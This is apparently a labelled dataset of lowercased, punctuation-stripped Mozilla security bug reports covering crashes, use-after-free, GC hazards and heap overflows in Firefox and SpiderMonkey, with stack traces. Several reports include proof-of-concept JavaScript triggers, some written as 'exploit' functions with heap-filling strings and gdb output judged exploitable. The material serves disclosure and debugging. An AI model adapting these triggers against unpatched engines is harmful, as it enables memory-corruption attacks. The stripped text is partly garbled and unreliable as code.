home/amil082/mozilla_trunk/mozilla/view/src/nsviewmanager.cpp:1618 19 in handleevent aevent at home/amil082/mozilla_trunk/mozilla/view/src/nsview.cpp:171 20 in nscommonwidget dispatchevent this aevent astatus reproducible always steps to reproduce 1 visit my testcase 2 click on the menu actual results crashes due to accessing freed memory expected results the menu should just disappear	11
mathml mtd with border-collapse html table crashes nsrulenode getstyledata nscachedstyledata getstyledata steps to reproduce 1 load the testcase a nightly crashes nsrulenode getstyledata dereferencing zero but my debug build crashes nscachedstyledata getstyledata dereferencing a random address so sg critical the debug build also complains assertion not implemented isbordercollapse aparentframe file users/admin/trunk/mozilla/layout/base/nscssframeconstructor.cpp line 1848	11
crash nshtmlframesetframe mousedrag happens in 1.8 and 1.9 testcase and patch coming 0 in kernel_vsyscall 1 in nanosleep_nocancel from lib/libc.so.6 2 in sleep from lib/libc.so.6 3 in ah_crap_handler signum=11 at nssighandlers.cpp:134 4 in nsprofilelock fatalsignalhandler signo=11 at nsprofilelock.cpp:210 5 signal handler called 6 in nshtmlframesetframe mousedrag this aprescontext aevent at home/smaug/mozilla/mozilla_cvs/mozilla/layout/generic/nsframesetframe.cpp:1547 7 in nshtmlframesetframe handleevent this aprescontext aevent aeventstatus at home/smaug/mozilla/mozilla_cvs/mozilla/layout/generic/nsframesetframe.cpp:793 8 in nspresshelleventcb handleevent this avisitor at home/smaug/mozilla/mozilla_cvs/mozilla/layout/base/nspresshell.cpp:1500 9 in nseventtargetchainitem handleeventtargetchain this avisitor aflags=6 acallback at home/smaug/mozilla/mozilla_cvs/mozilla/content/events/src/nseventdispatcher.cpp:476	11
passing in non-numeric values to canvas functions causes crash inside cairo the canvas api uses floats in the idl so the c method signatures just accept floats xpconnect uses js_valuetonumber to do the conversion from jsval to double and valuetonumber happily coverts non-numeric values e.g foo to nan cairo does n't handle nan or i assume inf well and so it leads to a crash	11
crash nslistboxbodyframe getnextitembox removing child from listboxbody loading the testcase makes firefox crash nslistboxbodyframe getnextitembox	11
passing unrooted value to obj_default_value is gc hazard consider the following example function prepare_xml delete xml.prototype.function tostring object.prototype.tostring getter tosource_getter return new xml a xml_text a var counter 0 function tosource_getter make sure that lastinternalresult does not contain prepare_xml var tmp tosource function return 1,2,3 uneval tmp if counter 2 return undefined run gc onr overwrite the heap if typeof gc function gc var x 1e-100 for var i 0 i 50000 i var x2 x 4 return a function that would access this in non-trivial way to check if prepare_xml was rooted return function return this.toxmlstring uneval tosource prepare_xml currently it gives me segmentation fault in the shell since the result of prepare_xml is accessed after it was gc-ed the culprit here is js_valuetosource code that does not root the result of tosource method before passing it to js_valuetostring this is a gc-hazard since it is possible to trigger a gc and collect the unrooted argument of js_valuetostring before it is accessed using a specially crafted xml object when js_valuetostring calls obj_default_value on an unrooted xml object eventually js_callfunctionname calls getmethod on the object to find its tostring method that in turn via getfunction would query the prototype chain since it is possible to remove tostring from xml objects and define a getter for object.prototype.tostring it allows to run gc in the getter and collect the object	11
crash involving uneval and function x count=8434 tryitout function x eval return 3 scary crash js uneval function function x eval return 3 null deref crash i do n't know why it s a scary crash when it s part of the fuzzer but a null deref outside of the fuzzer here s the mac crash reporter info for the scarier crash exception exc_bad_access codes kern_invalid_address at thread 0 crashed 0 libsystem.b.dylib strlen 8 1 js sprintcstring 32 crt.c:355 2 js decompile 892 crt.c:355 3 js js_decompilecode 448 crt.c:355 4 js js_decompilefunction 760 crt.c:355 5 js js_decompilefunction 116 crt.c:355 6 js js_fun_tostring 368 crt.c:355 7 js decompile 17572 crt.c:355 8 js js_decompilecode 448 crt.c:355 9 js js_decompilefunction 760 crt.c:355 10 js js_decompilefunction 116 crt.c:355 11 js js_fun_tostring 368 crt.c:355 12 js js_invoke 1548 crt.c:355 13 js js_internalinvoke 204 crt.c:355 14 js js_trymethod 284 crt.c:355 15 js js_valuetosource 180 crt.c:355 16 js str_uneval 28 crt.c:355 17 js js_invoke 1548 crt.c:355 18 js js_interpret 30808 crt.c:355 19 js js_execute 484 crt.c:355 20 js js_executescript 36 crt.c:355 21 js process 380 crt.c:355 22 js main 2032 crt.c:355 23 js start 340 crt.c:272 24 js start 60	11
avoid null dups and bad indexes in jsxml.c this is a spin-off of security-sensitive bug 354145 comment 71 with the bug 354145 fixed xml_child_helper may set rval to jsval_null but xml_child does not check for this leading to potential null pointer access	11
assertion failure slot fp nvars or js_interpret js function new script for var x in x debug assertion failure slot fp nvars at jsinterp.c:4629 opt crash js_interpret dereferencing an invalid address e.g	11
gc hazard in xmlequality the bug 354145 did not fix all the problems with script-induced xml tree mutations while the code walk through the tree in particular it did not address the case of xmlequality code as was pointed out in bug 354145 comment 82 the function contains the loop xvec jsxml xml xml_kids.vector vvec jsxml vxml xml_kids.vector for i 0 i n i xobj js_getxmlobject cx xvec i vobj js_getxmlobject cx vvec i if xobj vobj return js_false if js_xmlobjectops.equality cx xobj object_to_jsval vobj bp return js_false if bp break this is a gc hazard since xml_equality called by js_xmlobjectops.equality calls in certain cases js_valuetostring through manipulating xml.prototype.function tostring that can be triggered to call script-supplied code as the following 2 examples demonstrates callisto~/m/trunk/mozilla/js/src cat m/files/y1.js var xml new xml xml a text a a text a xml var xml2 new xml xml a text a a text a xml var list1 xml.a var list2 xml2.a xml.prototype.function tostring function if xml2 delete list2 1 delete list2 0 xml2 null gc return text var value list1 list2 callisto~/m/trunk/mozilla/js/src linux_all_dbg.obj/js m/files/y1.js before 9232 after 9232 break 08186000 segmentation fault core dumped callisto~/m/trunk/mozilla/js/src cat m/files/y2.js var xml new xml xml text a b a xml var xml2 new xml xml text a c a xml xml.prototype.function tostring function if xml2 delete xml2 xml2 null gc return text if xml xml2 throw unexpected result callisto~/m/trunk/mozilla/js/src linux_all_dbg.obj/js m/files/y1.js before 9232 after 9232 break 08186000 segmentation fault core dumped	11
unbalanced js_enter/leavelocalrootscope in js_errortoexception the code in js_errortoexception from jsexn.c contains protect the newly-created strings below from nesting gcs ok js_enterlocalrootscope cx if ok goto out out js_leavelocalrootscope cx that is it calls js_leavelocalrootscope even when the corresponding js_enterlocalrootscope fails since on tight memory it can be used to remove local root protection i mark the bug as security-related	11
crash with setter watch and gc js this.x setter new function this.watch x function gc x before 9232 after 9232 break 01205000 bus error i saw this jump to a bogus address a few times so i m marking the bug security-sensitive	11
crash findwatchpoint involving new script and gc in a debug js shell js this.__definesetter x gc this.watch x new script x 3 bus error exception exc_bad_access codes kern_protection_failure at thread 0 crashed 0 js findwatchpoint 72 jsdbgapi.c:305 1 js js_findwatchpoint 48 jsdbgapi.c:316 2 js js_addscopeproperty 2424 jsscope.c:1139 3 js js_changescopepropertyattrs 840 jsscope.c:1284 4 js js_changenativepropertyattrs 124 jsobj.c:2906 5 js js_setwatchpoint 1864 jsdbgapi.c:562 6 js obj_watch 308 jsobj.c:1453 7 js js_invoke 3912 jsinterp.c:1396 8 js js_interpret 69376 jsinterp.c:3948 9 js js_execute 960 jsinterp.c:1643 10 js js_executescript 64 jsapi.c:4194 security-sensitive because some of the other findwatchpoint crashes were trying to access addresses like	11
crash markgcthingchildren involving watch and setter crash document.watch title function a b c d return tostring function alert 1 document.title xxx no crash document.watch title function return tostring function alert 1 document.title xxx regression range on trunk is from 2006-11-06-04 to 2006-11-07-04 regression range on 1.8.0 branch is from 2006-11-24-07 to 2006-11-25-08 regressed from bug 354978 i m marking this security sensitive for now since i m not sure if this could be an exploitable crash or not steps to reproduce 0 load a testcase 1 click a button 2 an alert dialog appears 3 do n't close the alert dialog 4 after a few seconds crash	11
still missing root in js_newpropertyiterator the patch for bug 343290 did not root iterobj as such if non-native would ever allocate a new object the gc hazard still presents	11
heap overflow in mimeexternalbody_parse_eof heap overflow in mimeexternalbody_parse_eof mimeexternalbody_parse_eof h char pr_malloc at strlen at 0 does n't allocate space for ct and frob type ct overflows in addition in url strlen url 0 100 the constant 100 seems small and may be overflowed even if allocating ct overflowing mailbox to follow	11
apply_rfc2047_encoding has issues with really long headers when generating rfc2047 encoded headers we re not calculating the size of the buffer we ll need correctly which produces the predictable nasty issues	11
crash xulpopuplistenerimpl prelaunchpopup involving menupopup.menu null loading the testcase crashes firefox filing as security-sensitive because i do n't know what would happen if i set it to something other than null but controlled by content	11
crash js_getslotthreadsafe nsgetinterface operator js_getparent with testcase using iframe/timers/alert see upcoming testcase that i ll attach you need to let it run at least 5 seconds or so to let it build up multiple alert dialogs after waiting click them away at this point i crash often 50 of the time i get backtraces with different signatures so that s why i m filing it as security sensitive some talkback id s width different signatures tb18597168w js_getslotthreadsafe js_getparent nsdomclassinfo wrapnative nswindowsh setproperty xpc_wn_helper_setproperty js_setproperty js_setucproperty nswindowsh setproperty xpc_wn_helper_setproperty js_setproperty js_interpret tb18597034e nsgetinterface operator nscomptr_base assign_from_helper nscomptr nsiscriptglobalobject nscomptr nsiscriptglobalobject nslocationsh precreate xpcwrappednative getneworused xpcconvert nativeinterface2jsobject nsxpconnect wrapnative nsdomclassinfo wrapnative nswindowsh setproperty xpc_wn_helper_setproperty js_setproperty js_setucproperty nswindowsh setproperty xpc_wn_helper_setproperty js_setproperty js_interpret tb18588913w js_getparent nsdomclassinfo wrapnative nswindowsh setproperty xpc_wn_helper_setproperty js_setproperty js_setucproperty nswindowsh setproperty xpc_wn_helper_setproperty js_setproperty js_interpret this seems to have regressed between 2005-08-01 and 2005-08-02 i suspect bug 302889 might be the culprit	11
fix crash nslayoututils getfloatfromplaceholder using first-line floats caption and generated content see upcoming testcase which crashes mozilla upon load it does n't crash mozilla1.7 but it crashes in firefox1.5.0.4 that s why i m marking it security sensitive for now i have n't looked for a regression range for now i do n't have the necessary builds on this computer i could look for the regression range when i am at home talkback id tb20463441m nslayoututils getfloatfromplaceholder	11
crash nstreebodyframe visibilitychanged nsgfxscrollframeinner setscrollbarvisibility this crash looks like a security hole in a debug build it crashes trying to access memory at	11
float in column disappears crash nsblockframe isfloatcontainingblock nsblockframe clearlinecursor pad	11
crash nsiview destroy on print preview see upcoming testcases the unminimised testcase crashes on print preview the minimised testcase crashes when closing print preview for me the unminimised testcase also crashes on reflow branch builds for me but the testcase do n't crash on the latest 1.8 branch it seems to be fixed somehow on the 1.8 branch between 2006-08-02 and 2006-08-03 maybe fixed somehow with the patch for bug 302911	11
crash nshtmlreflowstate nshtmlreflowstate nsrulenode mark with unminimised testcase using generated content and lots of floats see upcoming testcases i do n't have a minimised testcase only a partly minimised testcase minimising is difficult this time the unminimised testcase has this talkback id tb27310357h nsrulenode mark mozilla\layout\style\nsrulenode.cpp line 4381 the partly minimised testcase has this talkback id tb27311489h nshtmlreflowstate nshtmlreflowstate mozilla\layout\generic\nshtmlreflowstate.cpp line 181 nslinelayout reflowframe mozilla\layout\generic\nslinelayout.cpp line 735 the 1.8.0.x and the 1.8.1 builds are also crashing so i m marking this security sensitive also the stacktrace has garbage at the top	11
crash nscounterlist setscope messing with counter-increment firefox crashes due to touching memory with a random address so i m filing this bug as security-sensitive here s the top of a stack trace from an opt build exception exc_bad_access codes kern_invalid_address at random thread 0 crashed 0 nscounterlist setscope 1 nscountermanager addresetorincrement 2 nscountermanager addcounterresetsandincrements 3 nscssframeconstructor initandrestoreframe 4 nscssframeconstructor constructblock	11
atob causes assertion index exceeds allowable range in nststring.h steps to reproduce atob null or atob result assertion index exceeds allowable range i mlength file dist/include/string/nststring.h line 133 filing as security-sensitive because it looks like there is no runtime check to prevent reading past the end of the string	11
script can drop a watchpoint that is in use cat double-unwatch.txt function exploit var rooter object filler1 filler2 u5555 for var i 0 i 32/2-2 i filler1 u5050 object.watch foo function object.unwatch foo object.unwatch foo for var i 0 i 8 1024 i rooter i filler1 filler2 object.foo bar exploit gdb eval run args dbg.obj/js double-unwatch.txt program received signal sigsegv segmentation fault in js_watch_set cx obj id=10767564 vp at jsdbgapi.c:384 384 clasp obj_get_class cx closure gdb print wp 1 links next prev object sprop setter handler closure incomplete type nrefs 21845 exploitable	11
pushobj is not gc-atomic when debugger is installed currently spidermonkey implements function call operator using a helper pushobj bytecode that pushes the obj register to the stack the register is populated during the previous jsop_getprrop js_name etc operation the problem is that the register does not belong to a root set so with the debugger installed a call like 1 can be a gc hazard this will happen when the debugger is called between name and pushobj bytecode and when the debugger calls js_gc or js_maybegc at that point	11
litopx deffun is exploitable cat litopx-deffun-x.txt function exploit var code for var i 0 i i if i 125 code void n else code void i n code function foo n eval code exploit gdb eval run args dbg.obj/js litopx-deffun-x.txt program received signal sigsegv segmentation fault in js_getprivate cx obj at jsapi.c:2298 2298 js_assert obj_get_class cx obj flags jsclass_has_private gdb print obj 1 map fslots 1127219200 126 1127219200 127 1127219200 128 dslots in other words bug 363988 is exploitable	11
js_get/setproperty s sprop local not gc safe this came out of my investigation into bug 337716 which looks like a crash bug due to js objects being gc d while we re using them but after hacking around that problem i then ran into this problem which is that i hit an assertion in obj_check_slot from js_setproperty the assertion is about us setting a property past the end of the allocated slots this happens when setting the location property of an iframe s global object which can trigger js_clearscope on the object and then also trigger the gc which can reclaim the jsscopeproperty in question when this happens the local jsscopeproperty pointer in the js_setproperty on the stack is no longer valid and once we unroll and try to use the sprop local we ll either touch deleted memory or re-initialized memory as it is in the cases i ve been able to catch in the debugger brendan claims js_getproperty suffers from the same problem too marking security sensitive as this can potentially be used to reference deleted memory	11
jsop_arguments does not set obj register the interpreter case for jsop_arguments does not set obj register as such using arguments in a function body will push the older value of obj register to the stack this is exploitable afaics as a script can organize to gc the old value and override arguments with an arbitrary function that would see as its this value gc-ed object	11
getter/setter bytecodes assume number of atoms is less then 64k the implementation of jsop_getter/jsop_setter prefix bytecodes assumes that an atom index for the following bytecode is less then 1 16 and ignores jsop_literal and friends bytecodes in particular the interpreter loop asserts on such bytecodes as the following example demonstrates m/files cat m/files/y1.js function g return 10 var n 100 1000 var src var x var array array n for var i 0 i n i array i i src array.join x.a getter g return x.a var f function src if f 10 throw unexpected result m/files m/trunk/mozilla/js/src/linux_all_dbg.obj/js m/files/y1.js assertion failure 0 at jsinterp.c:5347 trace/breakpoint trap core dumped the example builds a source with over 64k literal strings and adds x.a getter g to it then generates the following bytecode 803408 getter 803409 literal 100001 803413 setelem which is not handled by the current implementation this is exploitable as in the optimized build the code would access the junk values in various registers	11
large script miscompiles cat 019-large-script.txt function exploit var code obj for var i 0 i i if i 10242 code void n else code void x i n code export undefined n code void 125 n eval code exploit gdb eval run args opt.obj/js 019-large-script.txt program received signal sigsegv segmentation fault js_interpret cx pc 002\303 265 repeats 196 times result at jsinterp.c:4942 4942 id atom_to_jsid fun atom gdb print obj 1 map fslots 1127219200 6 15145248 6 15145296 6 dslots exploitable	11
compiling long xml filtering predicate hangs cat 020-long-filtering-predicate.txt function exploit var code foo x obj for var i 0 i i code 0 code 0 function code exploit dbg.obj/js 020-long-filtering-predicate.txt assertion failure 0 at jsemit.c:808 opt.obj/js 020-long-filtering-predicate.txt never returns	11
switch assumes all atom indexes below 64k the bytecode generator for the lookup form of the switch assumes that atom indexes always fits 2 bytes the following example that builds a code with over 64k strings demonstrates the problem with jsshell m/trunk/mozilla/js/src cat m/files/y4.js var n 100 1000 var src var x var array array n for var i 0 i n i array i i src array.join n src switch a case a case b case c return null return x var f function a src var r f a if r null throw unexpected result bad switch label m/trunk/mozilla/js/src m/trunk/mozilla/js/src linux_all_dbg.obj/js m/files/y4.js uncaught exception unexpected result bad switch label this is not exploitable as the interpreter checks for the atom type explicitly and can deal with any atom type similarly the decompiler uses a generic code to print atoms so this is safe still i keep the bug private as it strongly hints at similar problems that are exploitable see bug 365692 bug 366122	11
potential memory corruption in script_compile 160 in script_compile we retrieve oldscript before calling js_valuetostring cx argv 0 and js_valuetoobject cx argv 1 scopeobj during the calls to those functions oldscript can be freed by calling script.compile var s new script var o tostring function s.compile return s.compile o or var s new script var o valueof function s.compile return s.compile o js var s new script o tostring function s.compile return a s.compile o new date void 0 breakpoint 2 script_compile cx obj argc=1 argv rval at jsscript.c:252 252 js_destroyscript cx oldscript gdb p oldscript 1 jsscript gdb p/x oldscript 2 code length main version numglobalvars atommap vector length filename lineno depth trynotes principals object gdb n 254 script object obj gdb p/x oldscript 3 code length main version numglobalvars atommap vector length filename lineno depth trynotes principals object gdb c continuing breakpoint 2 script_compile cx obj argc=1 argv rval at jsscript.c:252 252 js_destroyscript cx oldscript gdb p/x oldscript 4 code length main version numglobalvars atommap vector length filename lineno depth trynotes principals object gdb n 254 script object obj gdb p/x oldscript 5 code length main version numglobalvars atommap vector length filename lineno depth trynotes principals object gdb c continuing program received signal sigsegv segmentation fault in free from lib/tls/i686/cmov/libc.so.6 gdb bt 0 in free from lib/tls/i686/cmov/libc.so.6 1 in malloc from lib/tls/i686/cmov/libc.so.6 2 in js_malloc cx nbytes=36 at jsapi.c:1678 3 in js_newscope cx nrefs=1 ops clasp obj at jsscope.c:145 4 in js_newobjectmap cx nrefs=1 ops clasp obj at jsobj.c:2215 5 in js_newobject cx clasp proto parent at jsobj.c:2486 6 in js_initclass cx obj parent_proto clasp constructor date nargs=7 ps fs static_ps static_fs at jsapi.c:2175 7 in js_initdateclass cx obj at jsdate.c:2170 8 in js_resolvestandardclass cx obj id=135621756 resolved at jsapi.c:1497 9 in global_resolve cx obj id=135621756 flags=0 objp at js.c:2672 10 in js_lookuppropertywithflags cx obj id=135630456 flags=0 objp propp at jsobj.c:3249 11 in js_lookupproperty cx obj id=135630456 objp propp at jsobj.c:3153 type return to continue or q return to quit 12 in js_findproperty cx id=135630456 objp pobjp propp at jsobj.c:3347 13 in js_interpret cx pc result at jsinterp.c:4131 14 in js_execute cx chain script down flags=0 result at jsinterp.c:1607 15 in js_executescript cx obj script rval at jsapi.c:4212 16 in process cx obj filename forcetty=0 at js.c:268 17 in processargs cx obj argv argc=0 at js.c:489 18 in main argc=0 argv envp at js.c:3167 gdb js var s new script o tostring function s.compile array 11 join array 11 join array 101 join aaaaa return a s.compile o void 0 breakpoint 2 script_compile cx obj argc=1 argv rval at jsscript.c:252 252 js_destroyscript cx oldscript gdb p oldscript 1 jsscript gdb p/x oldscript 2 code length main version numglobalvars atommap vector length filename lineno depth trynotes principals object gdb n 254 script object obj gdb p/x oldscript 3 code length main version numglobalvars atommap vector length filename lineno depth trynotes principals object gdb c continuing breakpoint 2 script_compile cx obj argc=1 argv rval at jsscript.c:252 252 js_destroyscript cx oldscript gdb p/x oldscript 4 code length main version numglobalvars atommap vector length filename lineno depth trynotes principals object gdb n program received signal sigsegv segmentation fault in free from lib/tls/i686/cmov/libc.so.6 gdb bt 0 in free from lib/tls/i686/cmov/libc.so.6 1 in js_free cx p at jsapi.c:1702 2 in js_freeatommap cx map at jsatom.c:995 3 in js_destroyscript cx script at jsscript.c:1399 4 in script_compile cx obj argc=1 argv rval at jsscript.c:252 5 in js_invoke cx argc=1 flags=0 at jsinterp.c:1348 6 in js_interpret cx pc result at jsinterp.c:4070 7 in js_execute cx chain script down flags=0 result at jsinterp.c:1607 8 in js_executescript cx obj script rval at jsapi.c:4212 9 in process cx obj filename forcetty=0 at js.c:268 10 in processargs cx obj argv argc=0 at js.c:489 11 in main argc=0 argv envp at js.c:3167 gdb	11
potential memory corruption in script_exec 262 in script_exec we retrieve script before calling js_valuetoobject cx argv 0 scopeobj during the call to js_valuetoobject script can be freed by calling script.compile var s new script var o valueof function s.compile return s.exec o js var s new script o valueof function s.compile array 11 join array 11 join array 101 join aaaaa return s.exec o void 0 breakpoint 2 script_exec cx obj argc=1 argv rval at jsscript.c:277 277 if js_valuetoobject cx argv 0 scopeobj gdb p script 1 jsscript gdb p/x script 2 code length main version numglobalvars atommap vector length filename lineno depth trynotes principals object gdb c continuing breakpoint 3 script_exec cx obj argc=1 argv rval at jsscript.c:279 279 argv 0 object_to_jsval scopeobj gdb p/x script 3 code length main version numglobalvars atommap vector length filename lineno depth trynotes principals object gdb c continuing program received signal sigtrap trace/breakpoint trap js_assert s version jsversion_default version jsversion_ecma_3 file jscntxt.c ln=180 at jsutil.c:63 63 abort gdb bt 0 js_assert s version jsversion_default version jsversion_ecma_3 file jscntxt.c ln=180 at jsutil.c:63 1 in js_onversionchange cx at jscntxt.c:180 2 in js_setversion cx version=97 at jscntxt.c:188 3 in js_interpret cx pc address out of bounds result at jsinterp.c:2272 4 in js_execute cx chain script down flags=32 result at jsinterp.c:1607 5 in script_exec cx obj argc=1 argv rval at jsscript.c:340 6 in js_invoke cx argc=1 flags=0 at jsinterp.c:1348 7 in js_interpret cx pc result at jsinterp.c:4070 8 in js_execute cx chain script down flags=0 result at jsinterp.c:1607 9 in js_executescript cx obj script rval at jsapi.c:4212 10 in process cx obj filename forcetty=0 at js.c:268 11 in processargs cx obj argv argc=0 at js.c:489 type return to continue or q return to quit 12 in main argc=0 argv envp at js.c:3167 gdb	11
potential memory corruption in script_tosource and script_tostring 72 133 in script_tosource and script_tostring we retrieve script before calling js_valuetoecmauint32 cx argv 0 indent during the call to js_valuetoecmauint32 script can be freed by calling script.compile var s new script var o valueof function s.compile s.tosource o or s.tostring o js var s new script o valueof function s.compile array 11 join array 11 join array 101 join aaaaa return s.tostring o void 0 breakpoint 2 script_tostring cx obj argc=1 argv rval at jsscript.c:149 149 if argc js_valuetoecmauint32 cx argv 0 indent gdb p script 1 jsscript gdb p/x script 2 code length main version numglobalvars atommap vector length filename lineno depth trynotes principals object gdb c continuing breakpoint 3 script_tostring cx obj argc=1 argv rval at jsscript.c:151 151 str js_decompilescript cx script script.prototype.tostring gdb p/x script 3 code length main version numglobalvars atommap vector length filename lineno depth trynotes principals object gdb c continuing program received signal sigsegv segmentation fault in decompile ss pc address out of bounds nb=6357089 at jsopcode.c:1614 1614 op jsop pc gdb bt 0 in decompile ss pc address out of bounds nb=6357089 at jsopcode.c:1614 1 in js_decompilecode jp script pc address out of bounds len=6357089 pcdepth=0 at jsopcode.c:4192 2 in js_decompilescript jp script at jsopcode.c:4212 3 in js_decompilescript cx script name script.prototype.tostring indent=0 at jsapi.c:4158 4 in script_tostring cx obj argc=1 argv rval at jsscript.c:151 5 in js_invoke cx argc=1 flags=0 at jsinterp.c:1348 6 in js_interpret cx pc result at jsinterp.c:4070 7 in js_execute cx chain script down flags=0 result at jsinterp.c:1607 8 in js_executescript cx obj script rval at jsapi.c:4212 9 in process cx obj filename forcetty=0 at js.c:268 10 in processargs cx obj argv argc=0 at js.c:489 type return to continue or q return to quit 11 in main argc=0 argv envp at js.c:3167 gdb	11
getter/setter issue is not yet fixed on branches the patch in bug 366396 is not sufficient to fix this on branches cached_get cached_set native_get native_set are related and this could be potentially exploitable var a set x a.x a resulting value is 2 obj slots 1 5 var a set x for var i 0 i 92169 3 i a i 1 a.x a.x a resulting value is 46084 obj slots 1 92169 var a set x for var i 0 i 3 i a i 1 a.x a.x.x crash obj slots 1 var a set x for var i 0 i 3 i a i 1 a.x typeof a.x a resulting value is string obj slots 1 var a get y a.y 10 for var i 0 i 3 i a i 1 glibc detected double free or corruption out 0 in kernel_vsyscall 1 in raise from lib/tls/i686/cmov/libc.so.6 2 in abort from lib/tls/i686/cmov/libc.so.6 3 in fsetlocking from lib/tls/i686/cmov/libc.so.6 4 in malloc_usable_size from lib/tls/i686/cmov/libc.so.6 5 in free from lib/tls/i686/cmov/libc.so.6 6 in js_free cx p at jsapi.c:1690 7 in allocslots cx slots nslots=8 at jsobj.c:2280 8 in js_allocslot cx obj slotp at jsobj.c:2733 9 in js_addscopeproperty cx scope id=5 getter=0 setter=0 slot=4294967295 attrs=1 flags=0 shortid=0 at jsscope.c:1134 10 in js_setproperty cx obj id=5 vp at jsobj.c:3699 11 in js_interpret cx pc 8\002 result at jsinterp.c:3737 12 in js_execute cx chain script down flags=32 result at jsinterp.c:1654 13 in obj_eval cx obj argc=1 argv rval at jsobj.c:1360 14 in js_invoke cx argc=1 flags=0 at jsinterp.c:1396 type return to continue or q return to quit	11
ordering problem in script_tosource i realized after checking it in that my recent patch introduced an ordering problem that was recommended in a review for a later patch here s the fix i landed my broken-ness on both branches of course yay me this may not itself be security-critical but it is a real bug and is related to patches from security-critical bugs so i have marked it security sensitive for now bug 367120 is where i originally perpetrated my mayhem	11
mathml crash szone_free nsunicoderenderingtoolkit gettextsegmentboundingmetrics setfontcharsetinfo outlinemetrics mozilla/5.0 macintosh u ppc mac os x mach-o en-us rv:1.9a1 gecko/20050901 firefox/1.6a1 1 load the testcase 2 dismiss the missing mathml fonts dialog when it appears result firefox crashes while the status bar counter says 1400 filing as security-sensitive becasue the testcase includes code from bug 306663	11
crash when window gets destroyed during an overflow event see upcoming testcase this regressed after bug 305120 got fixed with mozilla1.7 i do n't crash with the testcase not sure whether this is security sensitive but just to be sure i ve made it security sensitive talkback id tb18281315m presshell handleposteddomevents presshell diddoreflow presshell willpaint	11
crash when window gets destroyed during popuphiding event this is similar to bug 336739 but now with the popuphiding event that s why i also made this bug security sensitive this also crashes mozilla1.7 talkback id tb18335801z nspopupsetframe openpopup nspopupsetframe destroypopup nspopupboxobject hidepopup xpcwrappednative callmethod	11
crash when window gets destroyed on svgzoom event see upcoming testcase which crashes mozilla on load also crashes in firefox1.5.0.3 marking security sensitive just to be sure talkback id tb18394613w nssvgsvgelement didmodifysvgobservable nssvgvalue notifyobservers nssvgvalue didmodify xptc_invokebyindex xpcwrappednative callmethod	11
frames not destroyed with mmultiscripts and mtd upon loading the testcase assertion unexpected child list pr_false file users/admin/trunk/mozilla/layout/tables/nstableouterframe.cpp line 243 this assertion also fires in bug 348126 fwiw upon reloading assertion some frame destructors were not called mframecount 0 file users/admin/trunk/mozilla/layout/base/nspresshell.cpp line 625 if you have the patch from bug 334514 that adds this assertion crash dereferencing if you use the crashing testcase and you re using a debug build	11
crash nsgfxscrollframeinner getactualscrollbarsizes on print preview with branch builds with unminimised testcase i m attaching unminimised testcases here these also crash on branch builds on print preview i filed bug 362707 for a case that only crashes trunk builds on print preview so i can minimise this unminised testcase for branch builds if desired filing it as security sensitive just to be sure	11
crash nshtmlframesetframe getnoresize with dynamic changes loading the testcase makes firefox crash nshtmlframesetframe getnoresize	11
crash nssvgpathseglist getitem with pathseglist.getitem 1 the testcase triggers assertion nsvoidarray fastelementat index out of range 0 aindex aindex count file dist/include/xpcom/nsvoidarray.h line 72 followed by a crash note the use of fastelementat rather than safeelementat that means there s no runtime check in opt builds a simple fix would be to check that the print32-casted index is nonnegative in nssvgpathseglist getitem and the other functions but i think this code would be less confused if msegments were an nstarray which uses pruint32 indices instead of an nsvoidarray which uses print32 indices	11
crash nshtmlreflowstate computepadding on branch with partly minimised testcase from bug 363813 this is a follow-up from bug 363813 marking security sensitive since it s crashing branch builds i crash with the latest branch builds on the partly minimised testcase from bug 363813 talkback id tb28534877x nshtmlreflowstate computepadding mozilla/layout/generic/nshtmlreflowstate.cpp line 2444 nshtmlreflowstate initconstraints mozilla/layout/generic/nshtmlreflowstate.cpp line 1759 nshtmlreflowstate init mozilla/layout/generic/nshtmlreflowstate.cpp line 342 nshtmlreflowstate nshtmlreflowstate mozilla/layout/generic/nshtmlreflowstate.cpp line 217 nslinelayout reflowframe mozilla/layout/generic/nslinelayout.cpp line 913 nsinlineframe reflowinlineframe mozilla/layout/generic/nsinlineframe.cpp line 689 nsinlineframe reflowframes mozilla/layout/generic/nsinlineframe.cpp line 519 nsfirstlineframe reflow mozilla/layout/generic/nsinlineframe.cpp line 1049 nslinelayout reflowframe mozilla/layout/generic/nslinelayout.cpp line 996 nsblockframe reflowinlineframe mozilla/layout/generic/nsblockframe.cpp line 4245 nsblockframe doreflowinlineframes mozilla/layout/generic/nsblockframe.cpp line 3898 nsblockframe reflowinlineframes mozilla/layout/generic/nsblockframe.cpp line 3779 nsblockframe reflowline mozilla/layout/generic/nsblockframe.cpp line 2772 nsblockframe reflowdirtylines mozilla/layout/generic/nsblockframe.cpp line 2302 nsblockframe reflow mozilla/layout/generic/nsblockframe.cpp line 905 nscontainerframe reflowchild mozilla/layout/generic/nscontainerframe.cpp line 905 nshtmlscrollframe reflowscrolledframe mozilla/layout/generic/nsgfxscrollframe.cpp line 523 nshtmlscrollframe reflowcontents mozilla/layout/generic/nsgfxscrollframe.cpp line 571 nshtmlscrollframe reflow mozilla/layout/generic/nsgfxscrollframe.cpp line 769 nsblockreflowcontext reflowblock mozilla/layout/generic/nsblockreflowcontext.cpp line 606 nsblockframe reflowfloat mozilla/layout/generic/nsblockframe.cpp line 6030 nsblockreflowstate flowandplacefloat mozilla/layout/generic/nsblockreflowstate.cpp line 863 nsblockreflowstate placebelowcurrentlinefloats mozilla/layout/generic/nsblockreflowstate.cpp line 1132 nsblockframe placeline mozilla/layout/generic/nsblockframe.cpp line 4609 nsblockframe doreflowinlineframes mozilla/layout/generic/nsblockframe.cpp line 4010 nsblockframe reflowinlineframes mozilla/layout/generic/nsblockframe.cpp line 3779 nsblockframe reflowline mozilla/layout/generic/nsblockframe.cpp line 2772 nsblockframe reflowdirtylines mozilla/layout/generic/nsblockframe.cpp line 2302 nsblockframe reflow mozilla/layout/generic/nsblockframe.cpp line 905 nsblockreflowcontext reflowblock mozilla/layout/generic/nsblockreflowcontext.cpp line 606 nsblockframe reflowblockframe mozilla/layout/generic/nsblockframe.cpp line 3492 nsblockframe reflowline mozilla/layout/generic/nsblockframe.cpp line 2651 nsblockframe reflowdirtylines mozilla/layout/generic/nsblockframe.cpp line 2302 nsblockframe reflow mozilla/layout/generic/nsblockframe.cpp line 905 nscontainerframe reflowchild mozilla/layout/generic/nscontainerframe.cpp line 905 canvasframe reflow mozilla/layout/generic/nshtmlframe.cpp line 536 nscontainerframe reflowchild mozilla/layout/generic/nscontainerframe.cpp line 905 nshtmlscrollframe reflowscrolledframe mozilla/layout/generic/nsgfxscrollframe.cpp line 523 nshtmlscrollframe reflowcontents mozilla/layout/generic/nsgfxscrollframe.cpp 